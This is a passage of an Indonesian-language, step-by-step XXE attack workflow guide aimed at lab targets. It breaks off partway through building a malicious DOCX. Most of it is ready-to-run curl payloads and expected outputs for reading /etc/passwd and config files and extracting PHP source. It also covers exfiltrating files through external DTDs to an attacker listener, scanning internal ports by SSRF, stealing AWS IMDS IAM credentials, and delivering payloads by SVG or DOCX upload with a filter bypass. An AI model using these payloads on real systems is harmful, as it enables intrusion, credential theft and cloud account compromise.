"http://ATTACKER:8000/xxe.dtd">

<root>
    <value>test</value>
</root>
```

### 5. SSRF

```xml
<?xml version="1.0"?>

<!DOCTYPE root [
    <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">
]>

<root>
    <value>&xxe;</value>
</root>
```

---

# 🧩 One-Sentence Rule

```text
XXE bukan tentang menghafal payload.

XXE adalah:

XML Parser
   +
Entity Resolution
   +
External Resource Access
   +
Observable Channel
```

Semakin cepat Anda dapat mengidentifikasi keempat komponen tersebut, semakin cepat Anda menyelesaikan challenge XXE.

---

# [🧬 21 — XXE Workflow](/docs/xxe) — XXE Complete Attack Workflow: Interactive Decision Guide

> **Cara baca dokumen ini:** Setiap langkah punya **OUTPUT BERHASIL** ✅ dan **OUTPUT GAGAL/BERBEDA** ❌. Ikuti panah sesuai output yang kamu dapat. Jangan skip langkah.

---

## 🔧 PRE-FLIGHT: Setup Environment

Bash

```
# Jalankan INI DULU sebelum apapun. Satu kali di awal sesi.
export TARGET="10.10.11.200"
export LHOST="10.10.14.5"        # IP tun0 kamu (VPN HTB/THM)
export LPORT="8000"
mkdir -p ~/xxe_loot/{files,dtd,payloads,notes}
cd ~/xxe_loot

echo "[*] Target: $TARGET | LHOST: $LHOST:$LPORT"

# Setup DTD server (jalankan di terminal terpisah nanti)
# python3 -m http.server $LPORT
```

**Output yang diharapkan:**

text

```
[*] Target: 10.10.11.200 | LHOST: 10.10.14.5:8000
```

---

## ═══════════════════════════════════════

## FASE 0: IDENTIFIKASI XML ATTACK SURFACE

## ═══════════════════════════════════════

> **Tujuan:** Temukan semua endpoint yang menerima atau memproses XML sebelum mulai testing.

### Langkah 0.1 — Identifikasi Endpoint yang Menerima XML

Bash

```
# Command 1: Cek response headers untuk fingerprint teknologi
curl -sI "http://$TARGET/" | grep -iE '(server|x-powered-by|content-type)'

# Command 2: Cari clue XML di source code halaman
curl -s "http://$TARGET/" | grep -iE '(xml|soap|application/xml|text/xml|DOCTYPE)' | head -20

# Command 3: Cek API endpoints yang mungkin menerima XML
curl -sI "http://$TARGET/api/" 2>/dev/null | head -10
curl -sI "http://$TARGET/api/import" 2>/dev/null | head -10
curl -sI "http://$TARGET/soap" 2>/dev/null | head -10
```

**OUTPUT BERHASIL ✅ — Endpoint XML ditemukan:**

text

```
Content-Type: application/xml
X-Powered-By: PHP/7.4
```

atau:

text

```
HTTP/1.1 200 OK          ← endpoint /api/import exist
HTTP/1.1 405 Method Not Allowed  ← ada tapi butuh POST
```

➡️ Catat semua endpoint. Lanjut ke **Langkah 0.2**.

**OUTPUT BERHASIL ✅ — SOAP endpoint terdeteksi:**

HTML

```
<a href="/soap/wsdl">WSDL</a>
<SOAPAction:>
```

➡️ Ini SOAP endpoint → ke **Fase 7A (SOAP XXE)** setelah Fase 1.

---

### Langkah 0.2 — Identifikasi File Upload yang Mungkin Memproses XML

Bash

```
# Cari form upload di halaman
curl -s "http://$TARGET/" | grep -iE '(upload|file|svg|xml|docx|xlsx)' | head -20

# Cek endpoint upload langsung
for path in /upload /api/upload /import /api/import /file /document; do
    STATUS=$(curl -so /dev/null -w "%{http_code}" "http://$TARGET$path")
    echo "$STATUS → http://$TARGET$path"
done
```

**OUTPUT BERHASIL ✅ — Upload endpoint aktif:**

text

```
200 → http://10.10.11.200/upload
200 → http://10.10.11.200/api/import
405 → http://10.10.11.200/import     ← exist tapi perlu POST
```

➡️ Kandidat attack surface:

- `/api/import` → direct XML POST → Fase 1
- `/upload` → file upload → Fase 7B (SVG) atau Fase 7C (DOCX/XLSX)

---

## ═══════════════════════════════════════

## FASE 1: KONFIRMASI XML PARSER & ENTITY RESOLUTION

## ═══════════════════════════════════════

> **Tujuan:** Sebelum inject payload berbahaya, konfirmasi dulu bahwa parser menerima XML dan bisa resolve entity. Lakukan dari Level 0 ke Level 2 secara berurutan — JANGAN loncat.

### Langkah 1.1 — Level 0: Kirim XML Normal (Baseline)

Bash

```
# Command 1: Basic XML request
curl -i \
  -X POST \
  -H 'Content-Type: application/xml' \
  --data-binary @- \
  "http://$TARGET/api/import" <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<user>
  <name>alice</name>
  <role>user</role>
</user>
EOF
```

**OUTPUT BERHASIL ✅ — XML diterima:**

http

```
HTTP/1.1 200 OK
Content-Type: application/json

{"status":"ok","name":"alice","role":"user"}
```

➡️ Parser menerima XML. Lanjut ke **Langkah 1.2 (Level 1)**.

**OUTPUT GAGAL ❌ — 415 Unsupported Media Type:**

http

```
HTTP/1.1 415 Unsupported Media Type
{"error":"Expected JSON"}
```

➡️ Coba content-type lain:

Bash

```
# Coba text/xml
curl -i -X POST \
  -H 'Content-Type: text/xml' \
  --data-binary '<user><name>alice</name></user>' \
  "http://$TARGET/api/import"

# Coba application/xml dengan charset
curl -i -X POST \
  -H 'Content-Type: application/xml; charset=utf-8' \
  --data-binary '<user><name>alice</name></user>' \
  "http://$TARGET/api/import"
```

**OUTPUT GAGAL ❌ — 400 Bad Request / Invalid XML:**

text

```
{"error":"Invalid XML format"}
```

➡️ Endpoint ada tapi parser strict. Perhatikan exact XML structure yang dibutuhkan. Cek dokumentasi/WSDL jika ada.

---

### Langkah 1.2 — Level 1: Test Internal Entity Resolution

Bash

```
# Command: Internal entity - tidak pakai external resource
curl -i \
  -X POST \
  -H 'Content-Type: application/xml' \
  --data-binary @- \
  "http://$TARGET/api/import" <<'EOF'
<?xml version="1.0"?>
<!DOCTYPE user [
  <!ENTITY test "XXE_ENTITY_TEST_12345">
]>
<user>
  <name>&test;</name>
</user>
EOF
```

**OUTPUT BERHASIL ✅ — Entity di-resolve (KRITIS!):**

http

```
HTTP/1.1 200 OK
{"status":"ok","name":"XXE_ENTITY_TEST_12345"}
```

➡️ **Parser meng-expand entity!** Ini membuktikan DTD processing aktif. Lanjut ke **Langkah 1.3 (Level 2)**.

**OUTPUT GAGAL ❌ — Entity TIDAK di-resolve (literal &test; muncul):**

http

```
HTTP/1.1 200 OK
{"status":"ok","name":"&test;"}
```

atau:

text

```
{"status":"ok","name":""}
```

➡️ Entity processing diblok/disabled. Coba:

Bash

```
# Coba tanpa DOCTYPE, langsung entity (beberapa parser lebih permissive)
curl -i -X POST \
  -H 'Content-Type: application/xml' \
  --data-binary '<?xml version="1.0"?><user><name>&amp;test;</name></user>' \
  "http://$TARGET/api/import"

# Cek apakah XInclude support (Langkah 1.4)
# Cek apakah file upload support SVG (Fase 7B)
```

**OUTPUT GAGAL ❌ — 400/500 error saat ada DOCTYPE:**

text

```
{"error":"DOCTYPE is disallowed"}
{"error":"External entity processing disabled"}
```

➡️ DTD/DOCTYPE diblok secara eksplisit. Coba: XInclude (Langkah 1.4), SVG upload (Fase 7B), atau DOCX/XLSX (Fase 7C).

---

### Langkah 1.3 — Level 2: Test External Entity (File Read)

> **Gunakan file yang pasti ada dan harmless untuk validasi awal!**

Bash

```
# Command 1: Coba baca /etc/hostname (file paling sederhana, 1 baris)
curl -i \
  -X POST \
  -H 'Content-Type: application/xml' \
  --data-binary @- \
  "http://$TARGET/api/import" <<'EOF'
<?xml version="1.0"?>
<!DOCTYPE user [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<user>
  <name>&xxe;</name>
</user>
EOF

# Command 2: Windows target - coba win.ini
curl -i \
  -X POST \
  -H 'Content-Type: application/xml' \
  --data-binary @- \
  "http://$TARGET/api/import" <<'EOF'
<?xml version="1.0"?>
<!DOCTYPE user [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
]>
<user>
  <name>&xxe;</name>
</user>
EOF
```

**OUTPUT BERHASIL ✅ — File berhasil dibaca (JACKPOT!):**

http

```
HTTP/1.1 200 OK
{"status":"ok","name":"web01\n"}
```

atau:

text

```
{"status":"ok","name":"[fonts]\r\n[extensions]\r\n"}
```

➡️ **XXE CONFIRMED! Basic file disclosure bekerja!** Simpan temuan:

Bash

```
echo "XXE_CONFIRMED: file:/// works" >> ~/xxe_loot/notes/findings.txt
echo "Target hostname: web01" >> ~/xxe_loot/notes/findings.txt
```

➡️ Lanjut ke **Fase 2 (File Disclosure Lanjutan)**.

**OUTPUT BERHASIL ✅ — Ada output tapi kosong/error:**

http

```
HTTP/1.1 200 OK
{"status":"ok","name":""}
```

atau:

text

```
{"error":"permission denied"}
```

➡️ Parser resolve entity tapi file tidak bisa dibaca (permission issue). Coba file lain:

Bash

```
# Coba /etc/hosts
curl -i -X POST -H 'Content-Type: application/xml' \
  --data-binary '<?xml version="1.0"?><!DOCTYPE u [<!ENTITY x SYSTEM "file:///etc/hosts">]><u><n>&x;</n></u>' \
  "http://$TARGET/api/import"

# Coba /proc/version (Linux)
curl -i -X POST -H 'Content-Type: application/xml' \
  --data-binary '<?xml version="1.0"?><!DOCTYPE u [<!ENTITY x SYSTEM "file:///proc/version">]><u><n>&x;</n></u>' \
  "http://$TARGET/api/import"
```

**OUTPUT GAGAL ❌ — File muncul di-escape sebagai XML entities:**

text

```
{"name":"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1..."}
```

vs:

text

```
Error parsing XML: invalid character in entity value
```

➡️ File mengandung karakter yang merusak XML (`<`, `>`, `&`). Gunakan PHP wrapper atau CDATA approach:

Bash

```
# PHP wrapper untuk base64 encode (jika target PHP)
curl -i -X POST -H 'Content-Type: application/xml' \
  --data-binary @- "http://$TARGET/api/import" <<'EOF'
<?xml version="1.0"?>
<!DOCTYPE user [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<user><name>&xxe;</name></user>
EOF
# Jika berhasil, decode hasilnya:
# echo 'BASE64_OUTPUT' | base64 -d
```

---

### Langkah 1.4 — Fallback: Test XInclude (Jika DOCTYPE Diblok)

> Digunakan jika Langkah 1.2 gagal karena DOCTYPE diblok, TAPI endpoint menerima XML biasa.

Bash

```
# XInclude tidak memerlukan DOCTYPE
curl -i \
  -X POST \
  -H 'Content-Type: application/xml' \
  --data-binary @- \
  "http://$TARGET/api/import" <<'EOF'
<?xml version="1.0"?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/hostname" parse="text"/>
</root>
EOF
```

**OUTPUT BERHASIL ✅ — XInclude bekerja:**

http

```
HTTP/1.1 200 OK
{"result":"web01"}
```

➡️ **XInclude XXE confirmed!** Gunakan metode ini untuk file disclosure.

**OUTPUT GAGAL ❌ — XInclude juga diblok:**

text

```
{"error":"XInclude not supported"}
```

➡️ Coba SVG upload (Fase 7B) atau DOCX/XLSX (Fase 7C).

---

## ═══════════════════════════════════════

## FASE 2: FILE DISCLOSURE — BACA FILE SENSITIF

## ═══════════════════════════════════════

> **Masuk sini setelah Fase 1 konfirmasi file:/// bekerja.**

### Langkah 2.1 — File Disclosure Matrix (Linux)

Bash

```
# Jalankan semua secara berurutan, catat yang berhasil

# File 1: /etc/passwd - user enumeration
curl -s -X POST -H 'Content-Type: application/xml' \
  --data-binary @- "http://$TARGET/api/import" <<'EOF' | python3 -m json.tool 2>/dev/null || cat
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<r><d>&x;</d></r>
EOF

# File 2: /etc/hosts - network topology
curl -s -X POST -H 'Content-Type: application/xml' \
  --data-binary @- "http://$TARGET/api/import" <<'EOF'
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/hosts">]>
<r><d>&x;</d></r>
EOF

# File 3: Web app config (cari credentials!)
for path in /var/www/html/config.php /var/www/html/.env /var/www/html/wp-config.php \
            /etc/nginx/nginx.conf /etc/apache2/apache2.conf; do
  echo "=== Testing: $path ==="
  curl -s -X POST -H 'Content-Type: application/xml' \
    --data-binary "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file://$path\">]><r><d>&x;</d></r>" \
    "http://$TARGET/api/import"
  echo ""
done
```

**OUTPUT BERHASIL ✅ — /etc/passwd dibaca:**

text

```
{"d":"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n...www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n"}
```

➡️ **Ekstrak username dari /etc/passwd:**

Bash

```
# Simpan output dan ekstrak users
echo 'root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:...' > /tmp/passwd.txt

# Ekstrak users dengan shell (potensial untuk SSH)
grep -v '/nologin\|/false' /tmp/passwd.txt | awk -F: '{print $1}' | tee ~/xxe_loot/files/users.txt
echo "[*] Users with shell: $(wc -l < ~/xxe_loot/files/users.txt)"
```

**OUTPUT BERHASIL ✅ — Config file dengan credentials:**

text

```
$db_password = "SuperSecret2024!";
$db_user = "webapp";
APP_KEY=base64:abc123xyz
DB_PASSWORD=mysecretpass
```

➡️ **SIMPAN CREDENTIALS SEGERA:**

Bash

```
export DB_USER="webapp"
export DB_PASS="SuperSecret2024!"
echo "$DB_USER:$DB_PASS" >> ~/xxe_loot/files/found_creds.txt

# Test credentials ke database
# → Ke <a href="/docs/mysql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14a_mysql_workflow.md</a> atau [Pentest Workflow: Microsoft SQL Server (MSSQL) Exploitation](/docs/mssql)
```

---

### Langkah 2.2 — File Disclosure Matrix (Windows)

Bash

```
# Windows target
for path in "C:/Windows/win.ini" \
            "C:/Windows/System32/drivers/etc/hosts" \
            "C:/inetpub/wwwroot/web.config" \
            "C:/xampp/htdocs/config.php"; do
  echo "=== Testing: $path ==="
  curl -s -X POST -H 'Content-Type: application/xml' \
    --data-binary "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///$path\">]><r><d>&x;</d></r>" \
    "http://$TARGET/api/import"
  echo ""
done
```

**OUTPUT BERHASIL ✅ — win.ini dibaca:**

text

```
{"d":"[fonts]\r\n[extensions]\r\n[mci extensions]\r\n"}
```

➡️ XXE confirmed di Windows. Lanjut baca file sensitif.

---

### Langkah 2.3 — PHP Source Code Disclosure (Jika Target PHP)

> Digunakan ketika file PHP langsung dibaca menghasilkan error karena karakter `<?` rusak XML.

Bash

```
# PHP filter wrapper — base64 encode untuk bypass XML parsing issues
TARGET_FILES=(
  "/var/www/html/index.php"
  "/var/www/html/config.php"
  "/var/www/html/includes/db.php"
  "/var/www/html/admin/index.php"
)

for file in "${TARGET_FILES[@]}"; do
  echo "=== Trying: $file ==="
  RESULT=$(curl -s -X POST -H 'Content-Type: application/xml' \
    --data-binary "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"php://filter/convert.base64-encode/resource=$file\">]><r><d>&x;</d></r>" \
    "http://$TARGET/api/import")
  
  # Cek apakah ada base64 output
  B64=$(echo "$RESULT" | grep -oE '[A-Za-z0-9+/]{20,}={0,2}')
  if [ -n "$B64" ]; then
    echo "[+] SUCCESS! Decoding..."
    echo "$B64" | base64 -d | head -30
    echo "$B64" | base64 -d > ~/xxe_loot/files/"$(basename $file)"
    echo "[+] Saved to ~/xxe_loot/files/$(basename $file)"
  else
    echo "[-] No base64 output or file not found"
  fi
  echo ""
done
```

**OUTPUT BERHASIL ✅ — PHP source code berhasil di-exfil:**

text

```
[+] SUCCESS! Decoding...
<?php
$db_host = "localhost";
$db_user = "admin";
$db_pass = "P@ssw0rd_2024!";
$db_name = "webapp_db";
```

➡️ **Credentials database ditemukan!** Simpan dan pivot:

Bash

```
export DB_PASS="P@ssw0rd_2024!"
echo "DB: admin:P@ssw0rd_2024! @ localhost" >> ~/xxe_loot/files/found_creds.txt
# → Ke <a href="/docs/mysql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14a_mysql_workflow.md</a> untuk exploit database
```

---

## ═══════════════════════════════════════

## FASE 3: BLIND XXE — KETIKA TIDAK ADA OUTPUT

## ═══════════════════════════════════════

> **Masuk sini jika:** Entity di-resolve (Langkah 1.2 berhasil) tapi file content tidak muncul di response.

### Langkah 3.1 — Setup OOB Listener

Bash

```
# Terminal 1: Setup receiver sederhana
python3 -m http.server $LPORT

# ATAU gunakan script lebih advanced
cat > /tmp/xxe_receiver.py << 'PYEOF'
#!/usr/bin/env python3
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs
from datetime import datetime, timezone
import sys

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)
        ts = datetime.now(timezone.utc).isoformat()
        print(f"\n{'='*55}")
        print(f"[XXE CALLBACK] {ts}")
        print(f"From IP  : {self.client_address[0]}")
        print(f"Path     : {parsed.path}")
        if 'data' in params:
            import urllib.parse
            data = urllib.parse.unquote(params['data'][0])
            print(f"Data     : {data}")
        elif 'd' in params:
            data = params['d'][0]
            print(f"Data     : {data}")
        else:
            print(f"Query    : {parsed.query}")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")
    def log_message(self, *args): return

port = int(sys.argv[1]) if len(sys.argv) > 1 else 8000
print(f"[*] XXE Receiver listening on 0.0.0.0:{port}")
HTTPServer(('0.0.0.0', port), Handler).serve_forever()
PYEOF

python3 /tmp/xxe_receiver.py $LPORT &
RECEIVER_PID=$!
echo "[*] Receiver PID: $RECEIVER_PID"
```

**Output yang diharapkan (Terminal):**

text

```
[*] XXE Receiver listening on 0.0.0.0:8000
```

---

### Langkah 3.2 — Konfirmasi OOB Connectivity (Test Dasar)

Bash

```
# Step 1: Cek apakah target bisa reach LHOST (tanpa file read dulu)
curl -i -X POST -H 'Content-Type: application/xml' \
  --data-binary @- "http://$TARGET/api/import" <<EOF
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://$LHOST:$LPORT/xxe-test">
]>
<root><data>&xxe;</data></root>
EOF
```

**OUTPUT BERHASIL ✅ — Receiver mendapat callback:**

text

```
[XXE CALLBACK] 2024-01-15T10:30:00+00:00
From IP  : 10.10.11.200
Path     : /xxe-test
```

➡️ **Koneksi OOB confirmed!** Target bisa reach LHOST. Lanjut ke **Langkah 3.3**.

**OUTPUT GAGAL ❌ — Tidak ada callback di receiver:**

text

```
(silence — tidak ada request masuk)
```

➡️ Egress firewall blokir outbound HTTP. Coba:

Bash

```
# Coba DNS callback (port 53 sering diizinkan)
# Gunakan Burp Collaborator atau interactsh untuk DNS callback
# Install interactsh
go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
export PATH=$PATH:$(go env GOPATH)/bin
interactsh-client &
# Dapat domain seperti: abc123.oast.fun

# Gunakan domain dari interactsh
curl -i -X POST -H 'Content-Type: application/xml' \
  --data-binary '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://YOUR_INTERACTSH_DOMAIN/">]><r><d>&x;</d></r>' \
  "http://$TARGET/api/import"
```

---

### Langkah 3.3 — Blind XXE dengan External DTD (File Exfiltration)

Bash

```
# Step 1: Buat DTD file
cat > ~/xxe_loot/dtd/xxe.dtd << DTDEOF
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://$LHOST:$LPORT/?d=%file;'>">
%eval;
%send;
DTDEOF

echo "[*] DTD file created:"
cat ~/xxe_loot/dtd/xxe.dtd

# Step 2: Jalankan HTTP server untuk serve DTD (di terminal terpisah)
cd ~/xxe_loot/dtd && python3 -m http.server $LPORT &
DTD_PID=$!
echo "[*] DTD server PID: $DTD_PID (serving on port $LPORT)"
```

Bash

```
# Step 3: Kirim payload yang reference DTD external
curl -i -X POST -H 'Content-Type: application/xml' \
  --data-binary @- "http://$TARGET/api/import" <<EOF
<?xml version="1.0"?>
<!DOCTYPE root SYSTEM "http://$LHOST:$LPORT/xxe.dtd">
<root><data>test</data></root>
EOF
```

**OUTPUT BERHASIL ✅ — DTD request diterima, kemudian data di-exfil:**

text

```
(Di terminal DTD server/receiver)
10.10.11.200 - - "GET /xxe.dtd HTTP/1.1" 200 -

[XXE CALLBACK]
From IP  : 10.10.11.200
Path     : /
Data     : web01          ← isi /etc/hostname!
```

➡️ **Blind XXE OOB berhasil!** Ganti target file:

Bash

```
# Buat DTD untuk /etc/passwd
cat > ~/xxe_loot/dtd/xxe_passwd.dtd << DTDEOF
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://$LHOST:$LPORT/?d=%file;'>">
%eval;
%send;
DTDEOF

# Buat DTD untuk /etc/hosts
cat > ~/xxe_loot/dtd/xxe_hosts.dtd << DTDEOF
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://$LHOST:$LPORT/?d=%file;'>">
%eval;
%send;
DTDEOF

# Kirim untuk /etc/passwd
curl -s -X POST -H 'Content-Type: application/xml' \
  --data-binary "<?xml version=\"1.0\"?><!DOCTYPE root SYSTEM \"http://$LHOST:$LPORT/xxe_passwd.dtd\"><root><d>x</d></root>" \
  "http://$TARGET/api/import"
```

**OUTPUT GAGAL ❌ — DTD request masuk tapi tidak ada data callback:**

text

```
10.10.11.200 - - "GET /xxe.dtd HTTP/1.1" 200 -
(tidak ada data callback setelahnya)
```

➡️ Parser fetch DTD tapi tidak bisa expand parameter entity untuk exfil. Coba varian lain:

Bash

```
# Varian B: Direct parameter entity (untuk parser yang lebih permissive)
cat > ~/xxe_loot/dtd/xxe_v2.dtd << DTDEOF
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % send SYSTEM "http://$LHOST:$LPORT/?data=%file;">
%send;
DTDEOF

# Varian C: Gunakan error-based (Langkah 3.4)
```

---

### Langkah 3.4 — Blind XXE via Error-Based

Bash

```
# Trigger parser error yang mengandung data sensitif
curl -i -X POST -H 'Content-Type: application/xml' \
  --data-binary @- "http://$TARGET/api/import" <<'EOF'
<?xml version="1.0"?>
<!DOCTYPE user [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<user>
  <name>&xxe;</name>
</user>
EOF
```

**OUTPUT BERHASIL ✅ — Data muncul di error message:**

http

```
HTTP/1.1 500 Internal Server Error
{"error":"SAXParseException: unexpected character 'w' in entity value at line 1 of 'web01'"}
```

atau:

text

```
{"error":"XMLSyntaxError: opening and ending tag mismatch: name line 3 and web01"}
```

➡️ **Error-based XXE! Data hostname "web01" bocor di error message!** Gunakan file yang lebih besar tapi perlu cara yang lebih sophisticated:

Bash

```
# Trigger error dengan forced invalid entity yang mengandung file content
curl -i -X POST -H 'Content-Type: application/xml' \
  --data-binary @- "http://$TARGET/api/import" <<'EOF'
<?xml version="1.0"?>
<!DOCTYPE user [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<user><name>test</name></user>
EOF
```

**OUTPUT BERHASIL ✅ — Error mengandung file content:**

text

```
{"error":"I/O error : failed to load external entity 'file:///nonexistent/root:x:0:0:root:/root:/bin/bash\ndaemon:x:..."}
```

---

## ═══════════════════════════════════════

## FASE 4: XXE TO SSRF — PIVOT KE INTERNAL NETWORK

## ═══════════════════════════════════════

> **Masuk sini setelah file:/// bekerja, untuk probing internal services.**

### Langkah 4.1 — Test SSRF ke localhost

Bash

```
# Test port umum yang mungkin ada internal service
PORTS=(80 443 8080 8000 8443 3000 3001 4000 5000 6379 27017 5432 3306 1433 9200 9300)

for port in "${PORTS[@]}"; do
  echo -n "Testing port $port... "
  RESPONSE=$(curl -s --max-time 5 -X POST -H 'Content-Type: application/xml' \
    --data-binary "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"http://127.0.0.1:$port/\">]><r><d>&x;</d></r>" \
    "http://$TARGET/api/import" 2>/dev/null)
  
  # Cek berbagai indikator
  if echo "$RESPONSE" | grep -qiE '(html|<!|title|server|admin|panel)'; then
    echo "[OPEN - HTML Response!]"
    echo "$RESPONSE" | head -5
  elif echo "$RESPONSE" | grep -qiE '(connection refused|timeout|error)'; then
    echo "[CLOSED/FILTERED]"
  elif [ -n "$RESPONSE" ]; then
    echo "[POSSIBLE OPEN - Got response]"
    echo "$RESPONSE" | head -2
  else
    echo "[NO RESPONSE]"
  fi
done
```

**OUTPUT BERHASIL ✅ — Internal service ditemukan:**

text

```
Testing port 80... [OPEN - HTML Response!]
{"d":"<html><head><title>Internal Admin Panel</title>..."}

Testing port 8080... [OPEN - HTML Response!]
{"d":"Welcome to Tomcat Manager..."}

Testing port 6379... [POSSIBLE OPEN - Got response]
{"error":"Redis protocol error"}
```

➡️ **Internal services ditemukan!** Eksplor lebih lanjut:

Bash

```
# Baca halaman admin internal
curl -s -X POST -H 'Content-Type: application/xml' \
  --data-binary @- "http://$TARGET/api/import" <<'EOF'
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:80/admin">
]>
<root><data>&xxe;</data></root>
EOF

# Coba endpoint API internal
curl -s -X POST -H 'Content-Type: application/xml' \
  --data-binary @- "http://$TARGET/api/import" <<'EOF'
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/api/users">
]>
<root><data>&xxe;</data></root>
EOF
```

---

### Langkah 4.2 — Cloud Metadata via XXE SSRF

> **Jika target ada di cloud environment (AWS/GCP/Azure)**

Bash

```
# AWS IMDSv1 (jika target di AWS dan belum IMDSv2)
curl -s -X POST -H 'Content-Type: application/xml' \
  --data-binary @- "http://$TARGET/api/import" <<'EOF'
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root><data>&xxe;</data></root>
EOF
```

**OUTPUT BERHASIL ✅ — AWS metadata accessible (IMDSv1):**

text

```
{"data":"ami-id\nami-launch-index\nami-manifest-path\nhostname\niam/\ninstance-id\nlocal-ipv4\n"}
```

➡️ Dapatkan IAM credentials:

Bash

```
# Step 1: Cari IAM role
curl -s -X POST -H 'Content-Type: application/xml' \
  --data-binary '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]><r><d>&x;</d></r>' \
  "http://$TARGET/api/import"
# Output: MyIAMRoleName

# Step 2: Ambil credentials dari role
curl -s -X POST -H 'Content-Type: application/xml' \
  --data-binary '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/MyIAMRoleName">]><r><d>&x;</d></r>' \
  "http://$TARGET/api/import"
# Output: AccessKeyId, SecretAccessKey, Token
# → Ke <a href="/docs/aws-pentest" class="text-[#00b4d8] hover:underline font-mono font-semibold">60_aws_pentest_workflow.md</a>
```

**OUTPUT GAGAL ❌ — IMDSv2 (Token required):**

text

```
{"error":"HTTP 401 - Token required"}
```

➡️ IMDSv2 membutuhkan PUT + header → tidak bisa via XXE (parser hanya GET). Skip ke internal service probing.

---

## ═══════════════════════════════════════

## FASE 5: XXE VIA FILE UPLOAD

## ═══════════════════════════════════════

> **Gunakan jika direct XML POST tidak bisa, tapi ada file upload.**

### Fase 5A — SVG Upload

Bash

```
# Step 1: Buat SVG dengan XXE payload
cat > ~/xxe_loot/payloads/xxe.svg << 'SVGEOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="500" height="100">
  <text x="10" y="50">&xxe;</text>
</svg>
SVGEOF

# Step 2: Upload SVG
curl -i \
  -X POST \
  -F "file=@~/xxe_loot/payloads/xxe.svg;type=image/svg+xml" \
  "http://$TARGET/upload"
```

**OUTPUT BERHASIL ✅ — SVG diproses dan data muncul:**

http

```
HTTP/1.1 200 OK
{"preview":"<svg>...<text x='10' y='50'>web01</text>...</svg>","url":"/uploads/xxe.svg"}
```

atau preview file menampilkan hostname.

➡️ **SVG XXE confirmed!** Ganti entity untuk baca file sensitif.

**OUTPUT GAGAL ❌ — SVG ditolak:**

text

```
{"error":"Only PNG/JPG allowed"}
```

➡️ Coba bypass extension:

Bash

```
# Rename dengan double extension atau Content-Type manipulation
curl -i -X POST \
  -F "file=@~/xxe_loot/payloads/xxe.svg;type=image/png;filename=xxe.svg.png" \
  "http://$TARGET/upload"
```

---

### Fase 5B — DOCX/XLSX Upload

Bash

```
# Step 1: Buat DOCX dengan XXE
mkdir -p /tmp/xxe_docx/word
cd /tmp/xxe_docx

# Buat word/document.xml dengan XXE
cat > word/document.xml << 'XMLEOF'
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE w:document [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p><w:r><w:t>&xxe;</w:t></w:r></w:p>
  </w:body>
</w:document>
XMLEOF

# Buat [Content_Types].xml minimum
cat > '[Content_Types].xml' << 'CTEOF'
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>
CTEOF

# Buat _rels/.rels
mkdir -p _rels
cat > _rels/.rels << 'RELEOF'
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>
RELEOF

